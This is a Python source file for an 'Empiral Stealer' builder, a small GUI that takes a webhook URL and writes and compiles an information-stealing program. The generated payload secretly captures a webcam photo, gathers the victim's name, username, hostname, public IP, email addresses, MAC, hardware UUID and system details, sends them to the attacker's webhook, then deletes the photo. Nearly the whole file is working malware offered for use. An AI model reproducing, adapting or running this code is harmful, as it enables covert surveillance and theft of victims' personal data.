import os
import shutil
import customtkinter as ctk
from tkinter import messagebox, filedialog

ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title(f"Empiral Stealer Builder ")
app.geometry("400x240")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def build():
    msg = entry.get()
    a = open("grab.py", "a")
    b = open("grab.py", "a")
    if msg:
        a.write(f"""import requests
import platform
import socket
import psutil
import subprocess
import os
import json
import cv2

WEBHOOK_URL = "{msg}"

""")
        b.write(r"""
def capture_webcam():
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("")
        return

    ret, frame = cap.read()

    if ret:
        cv2.imwrite("webcam.jpg", frame)
        print("")

    cap.release()

capture_webcam()





architecture = platform.machine()


host_name = platform.node()
user_full_name = subprocess.check_output(['powershell', '(Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).FullName']).decode().strip()
user_name = os.getenv('USERNAME')

ip = subprocess.check_output(['powershell', 'Invoke-RestMethod -Uri "https://ipapi.co/ip/"']).decode().strip()


command = 'powershell.exe "systeminfo | Select-String -Pattern \'@\' | ForEach-Object { $_.Line -split \' \' | Where-Object { $_ -like \'*@*.*\' } }"'
output = subprocess.check_output(command, shell=True, text=True)



ipv4 = socket.gethostbyname(socket.gethostname())
mac_addresses = [link.address for link in psutil.net_if_addrs().get('Ethernet', [])]
uuid = subprocess.check_output(['wmic', 'csproduct', 'get', 'UUID']).decode().split('\n')[1].strip()
mac = ','.join(mac_addresses)
architecture = platform.architecture()
machine = platform.machine()
platform = platform.platform()
ram_info = round(psutil.virtual_memory().total / (1024 ** 3), 2)
display_version = subprocess.check_output(['powershell', '(Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name "DisplayVersion").DisplayVersion']).decode().strip()





embed = {
    "title": "Dark Stealer stole information",
    "color": 16711680, 
    "fields": [
        {
            "name": "User Info",
            "value": f"Full Name: ||{user_full_name}||\nUsername: ||{user_name}||\nHostname: ||{host_name}||",
            "inline": True
        },
        {
            "name": "PC Info",
            "value": f"IP: ||{ip}||",
            "inline": True
        },
        {
            "name": "EMAIL",
            "value": f"||{output}||",
            "inline": False
        },
        {
            "name": "PC Data",
            "value": f"||{architecture},MACHINE : {machine},MAC : {mac}, PLATFORM : {platform}, UUID : {uuid},RAM : {ram_info},DISPLAY VERSION : {display_version}||",
            "inline": False
        }
    ]
}

response = requests.post(WEBHOOK_URL, json={"embeds": [embed]})

if response.status_code == 200:
    print("")
else:
    print("", response.status_code)


def webcam(WEBHOOK_URL, title, description, image_path):
    with open(image_path, "rb") as image_file:
        image_data = {
            'file': ('webcam.jpg', image_file, 'image/jpeg')
        }

        payload = {
            'embeds': [{
                'title': title,
                'description': description,
                'color': 16711680,  
                'image': {'url': 'attachment://webcam.jpg'}
            }]
        }

        response = requests.post(WEBHOOK_URL, files=image_data, data={'payload_json': json.dumps(payload)})

        if response.status_code == 200:
            print("")
        else:
            print("ERROR :", response.status_code)

                

title = 'SCREENSHOT WEBCAM'
description = 'Webcam Screenshot (Retr0)'
image_path = 'webcam.jpg'

webcam(WEBHOOK_URL, title, description, image_path)
if response.status_code == 204:
    print("")
else:
    print("ERROR : ", response.status_code)


os.system("DEL webcam.jpg")
                
""")
        messagebox.showinfo("EMPIRAL", "the file was created")
        os.system("pyinstaller grab.py")

label = ctk.CTkLabel(master=app, text="Empiral Stealer", text_color=("white"), font=("Helvetica", 26))
label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build", text_color="white", hover_color="#363636", fg_color="black", command=build)
button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)

app.mainloop()